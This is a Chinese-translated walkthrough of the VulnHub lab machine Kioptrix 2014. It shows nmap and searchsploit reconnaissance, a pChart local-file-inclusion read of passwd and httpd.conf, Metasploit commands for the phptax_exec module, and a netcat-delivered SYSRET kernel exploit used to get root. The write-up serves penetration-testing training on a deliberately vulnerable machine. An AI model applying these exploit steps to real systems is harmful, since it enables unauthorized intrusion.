# Vulnhub 对 2014 年 Kioptrix 的报道(#5)

> 原文：<https://infosecwriteups.com/vulnhub-oscp-type-kioptrix-5-writeup-16b73a3afa10?source=collection_archive---------0----------------------->

*这是来自*[*VulnHub*](https://www.vulnhub.com/)*的机器* [*KIOPTRIX*](https://www.vulnhub.com/entry/kioptrix-2014-5,62/) *的特写。*

# 摘要

Kioptrix 基于 FreeBSD 9.0，在 phptax 漏洞的帮助下，我们获得了初始外壳，而 **SYSRET** 内核漏洞帮助我们获得了根。

> 机器作者: [Kioptrix](https://twitter.com/loneferret)
> 机器类型:FreeBSD 9.0

# 专有技术

*   Nmap
*   Searchsploit
*   Metasploit

# 吸收技能

*   pChart 2.1.3 漏洞利用
*   phptax 漏洞利用
*   SYSRET 内核漏洞(CVE:[2012–0217](https://nvd.nist.gov/vuln/detail/CVE-2012-0217))

# 扫描网络

```
$nmap -sC -sV 192.168.0.130
```

![](img/77d391107fd975eed6c342cf87ab7288.png)

man nmap

![](img/1edf98b47994e065ecd9c63997aaee8c.png)

nmap 结果

有两个端口是开放的，80 和 8080。端口 8080 给我们禁止，端口 80 显示“它的作品”的消息。

![](img/b28f8805cb15f7478fa4a515c9d10bdd.png)

端口 8080

![](img/2fa1b1194d9ccba97af3dd2a5541cec1.png)

端口 80

第 80 页的页面源给了我们一个 URL 的提示。

![](img/8beaf95f4a65cd5794f0acba81236a1a.png)

页面源

# 利用服务器

![](img/b4da3165010f32021fe08e202e3c95b4.png)

pChart 应用程序

有一个 pChart 应用程序，在用版本做 searchsploit 时，发现了多个漏洞。

```
$searchsploit pchart 2.1.3
```

![](img/affcd3c77fa6e115a69c3f11ec5fd289.png)

```
$searchsploit -m exploits/php/webapps/31173.txt
$cat 31173.txt
```

将漏洞复制到当前工作目录。

![](img/ac00c081e70e408e190addae0a329cd1.png)

人工搜索

```
$cat 31173.txt
```

![](img/a2169acee009d16d738890dec90f127f.png)

LFI

LFI 正在工作，我们试着抢一下， **etc/passwd** 文件。

记下操作系统版本，这可能有助于权限提升。

![](img/3b2df9042507a0dbb732e319a7b00243.png) [## 29.8.Apache HTTP 服务器

### 开源的 Apache HTTP 服务器是使用最广泛的 web 服务器。

www.freebsd.org](https://www.freebsd.org/doc/handbook/network-apache.html) 

让我们获取用于存储配置的 httpd.conf 文件。

![](img/33b0a49ea9b379bd7351a29ce4f16d4c.png)

freebsd 中的 httpd.conf 位置

![](img/3f8ac34925275ae3a9e6f4c11c11b645.png)

httpd.conf

在初始侦察端口期间，8080 是不可访问的，让我们尝试在 httpd.conf 文件中找到它。

![](img/c6c24fcd4aa667dc0389e11a8fc0595a.png)

要访问 8080 端口，用户代理必须是 Mozilla/4.0 Mozilla4_browser。

![](img/97c5dbbc5e4eba08ae7c6cdf93ab660c.png)

更改用户代理

端口 8080 有一个 phptax 应用程序正在运行，让我们使用 searchsploit 尝试找出应用程序中存在的任何漏洞。

![](img/a0608aa3b34e372eefe7fa4d13e0b561.png)

端口 8080

```
$searchsploit phptax
```

![](img/3dedfe983005fce7e62c29cdd1a2a3c9.png)

# 拥有 WWW

```
$msfconsole
msf5 > search phptax
msf5 > use exploit/multi/http/phptax_exec  
msf5 exploit(**multi/http/phptax_exec**) > set RHOSTS 192.168.0.130 
msf5 exploit(**multi/http/phptax_exec**) > set RPORT 8080 
msf5 exploit(**multi/http/phptax_exec**) > exploit
```

![](img/e430969ed5e6aea9aa80c1345a9e1db5.png)

msfconsole

![](img/ad80407b93365847ddbf91fe12839c60.png)

初始外壳

# 自己的根

在最初的侦察中，我们发现 FreeBSD 版本是 9，让我们尝试找出是否有任何内核级的漏洞，这将有助于获得根。

```
$searchsploit FreeBSD 9.0
```

![](img/4392aa8eb868855b8069e48c91ce2ae3.png)

搜索结果

让我们试着把漏洞转移到机器上，wget 和 curl 没有安装到机器上，所以我用 Netcat 上传。

![](img/0b98f355c7cf4871f41d79afd3208cdf.png)

man nc

![](img/8cd741728480cde3433ac5596a49985c.png)

宿主

![](img/f83e683f1a40387827b7a950e738dbf2.png)

man nc

![](img/c863ddf80b23d4c3879641a28b368ec0.png)

基奥普特里克斯

![](img/ebbed9c281134aff9ee7e634c030f2ae.png)

拥有根

[](https://medium.com/@yashanand155) [## 增量中等

### 从 inc0gnito 介质上读取文字。夺旗类游戏🚩|| HACKTHEBOX ||反转。每天，成千上万的人…

medium.com](https://medium.com/@yashanand155) 

*感谢阅读！如果你喜欢这个故事，请* ***点击*** 👏 ***按钮，分享*** *它来帮助别人！欢迎发表评论*💬*下图。有反馈？下面我们连线上* [*推特*](https://twitter.com/yashanand155) *。*

# ❤️由[增加到](https://twitter.com/yashanand155)

[](https://twitter.com/yashanand155) [## inc0gnito

### CTF 玩家| | hack the box | | CTFs with @ ABS 0 lut 3 pwn 4g 3🚩

twitter.com](https://twitter.com/yashanand155) 

*关注* [*Infosec 报道*](https://medium.com/bugbountywriteup) *获取更多此类精彩报道。*

[](https://medium.com/bugbountywriteup) [## 信息安全报道

### 收集了世界上最好的黑客的文章，主题从 bug 奖金和 CTF 到 vulnhub…

medium.com](https://medium.com/bugbountywriteup)